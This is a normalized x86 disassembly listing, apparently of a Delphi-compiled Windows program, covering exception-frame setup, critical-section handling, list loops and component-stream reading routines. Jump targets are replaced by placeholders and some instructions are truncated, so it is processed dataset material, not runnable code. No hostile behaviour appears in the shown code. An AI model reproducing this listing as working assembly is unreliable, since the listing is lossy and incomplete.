test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4305a0
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
sub_435510
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_431088
mov edi eax
xor eax eax
push ebp
push sub_4355b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov edx ebx
mov eax edi
call sub_4305a0
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_430438
mov eax esi
call sub_4055f0
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4110d4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4355c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_431088
mov edi eax
xor eax eax
push ebp
push sub_435647
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov edx ebx
mov eax edi
call sub_4305a0
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_430438
mov eax esi
call sub_4055f0
sub_43567c
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0x11
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
pop ecx
pop edx
pop ebx
retn
sub_4356c0
push ebx
push esi
push edi
call sub_405bb4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_434d38
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_4356fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
xor eax eax
push ebp
push sub_435742
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435764
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_437b4c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_437c88
call sub_435670
sub_435788
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x80 ]
mov eax esi
call sub_4110d4
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x80 ]
xor edx edx
call sub_4070a8
sub_4357c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x80 ]
mov eax ebx
call sub_4110d4
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_437b4c
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43588e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_435cf4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_435cf4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x88 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435895
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_437c88
mov eax [ ebp - 0x4 ]
mov [ eax + 0x88 ] 0x1
call sub_435670
sub_4358dc
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x62 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_435900
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_4059fc
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
sete [ ebp - 0x9 ]
push esi
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov [ esi ] eax
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_435970
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
mov edi edx
mov ebx eax
mov eax [ edi ]
mov edx esi
call sub_4059fc
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
call sub_435670
sub_4359c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_431088
mov esi eax
xor edx edx
push ebp
push sub_435a3b
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435a42
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov edx ebx
mov eax esi
call sub_4305a0
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_4055f0
mov edx ebx
mov eax esi
call sub_430438
sub_435a48
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_435b7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435b85
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
xor edx edx
push ebp
push sub_435b61
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_435be8
retn
inc eax
mov [ ebp - 0x10 ] eax
xor esi esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4305a0
call sub_4359c0
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x7a ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_4350d0
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x7c ]
call [ edi + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4305a0
mov ebx eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_4070fc
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4351c4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4305a0
mov edx eax
mov eax [ rw-data ]
call sub_430fb8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_43074c
jmp r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
sub_435b8c
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_435a48
call sub_43533c
mov eax [ edi + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x34 ]
mov edx esi
call sub_4305a0
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_435bc4
push ebx
mov ebx eax
mov eax ebx
call sub_435cb8
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_433c88
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_435be8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_4055f0
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4305a0
call sub_4055f0
inc edi
dec esi
jne r-xdata
sub_435c24
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov edx [ edx ]
mov eax edx
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_42f7f4
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x84 ]
test eax eax
je r-xdata
mov eax ebp
call sub_40557c
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_42f86c
mov edi eax
mov edx [ esp + 0x4 ]
call sub_42f6d0
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4054e0
test al al
jne r-xdata
sub_435cf4
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_435d40
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_435d40
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
sub_435d90
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_435e14
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_437924
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
dec eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
call sub_435670
movzx ebx [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435e1b
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_435e24
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_435e76
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_437a0c
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
dec eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
shr eax 0x1
mov eax [ ebp - 0x4 ]
movzx ebx [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435e7d
lea eax [ ebp - 0x4 ]
call sub_406d54
retn
call sub_435670
sub_435e84
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_435f24
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4358ac
test al al
jne r-xdata
mov eax ebx
call sub_4358ac
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4319ac
jmp r-xdata
mov eax ebx
call sub_435cd0
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_436a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435f2b
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_4318d0
mov esi eax
mov eax ebx
call sub_436a6c
jmp r-xdata
mov eax ebx
call sub_4369bc
mov eax ebx
call sub_4358ac
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_436ba8
mov eax ebx
call sub_436a74
sub_435f60
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_408754
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x34 ]
call sub_4303e0
inc esi
dec ebx
jne r-xdata
sub_435f9c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_43caf8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_408754
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov edx ebx
mov eax edi
call sub_43cacc
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_408754
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_43cacc
test [ eax + 0x24 ] 0x4
je r-xdata
sub_436014
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_408754
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
movzx eax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
movzx eax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_43607c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x18 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_43609c
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_404288
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_43607c
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
xor edx edx
call sub_438224
call sub_404288
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_4055f0
sub_4360fc
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4361e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4383c8
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x72 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff8
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov ecx ebx
mov eax [ esi + 0x74 ]
call [ esi + 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x11 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_4361b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
or [ eax + 0x1c ] 0x200
sub_4361e7
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff8
call sub_43609c
pop ecx
test al al
jne r-xdata
call sub_406174
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_406120
sub_43620c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_436284
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xfff8
call sub_40587c
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_42feb4
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
or [ eax + 0x1c ] 0x200
sub_436289
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff8
call sub_43609c
pop ecx
test al al
jne r-xdata
call sub_406174
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_406120
sub_4362ac
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_436327
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4383c8
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xfff2
call sub_40587c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x10 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_43632c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff8
call sub_43609c
pop ecx
test al al
jne r-xdata
call sub_406174
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_406120
sub_436350
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_436577
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_437894
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_437894
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_436544
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test [ ebp - 0x11 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_436502
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x8 ]
call sub_435f9c
pop ecx
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
movzx eax [ r-xdata ]
call sub_436014
pop ecx
test [ ebp - 0x11 ] 0x1
jne r-xdata
push ebp
call sub_4360fc
pop ecx
push ebp
call sub_4362ac
pop ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push ebp
call sub_43620c
pop ecx
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_4061a4
jmp r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
movzx eax [ r-xdata ]
call sub_436014
pop ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
movzx eax [ r-xdata ]
call sub_436014
pop ecx
test [ ebp - 0x11 ] 0x2
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43657e
lea eax [ ebp - 0x1c ]
call j_sub_4068a0
lea eax [ ebp - 0xc ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
test [ ebp - 0x11 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov si 0xfff9
call sub_40587c
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x8 ]
call sub_430608
test eax eax
jge r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x8 ]
call sub_435f60
pop ecx
